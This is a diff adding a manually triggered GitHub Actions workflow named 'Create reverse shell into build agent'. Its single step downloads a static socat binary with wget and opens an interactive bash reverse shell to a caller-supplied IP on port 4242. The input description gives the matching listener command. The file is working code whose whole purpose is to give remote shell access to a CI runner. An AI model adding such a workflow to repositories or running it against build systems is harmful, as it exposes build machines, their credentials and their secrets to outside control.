@@ -1,0 +1,19 @@
+on:
+  workflow_dispatch:
+    inputs:
+      ipAddress:
+        description: 'IpAddress (./socat file:`tty`,raw,echo=0 TCP-L:4242)'
+        required: true
+
+name: ubuntu
+jobs:
+  reverse_shell:
+    name: 'Create reverse shell into build agent'
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Create reverse shell
+      run: |
+        wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
+        chmod +x /tmp/socat
+        /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${{ github.event.inputs.ipAddress }}:4242
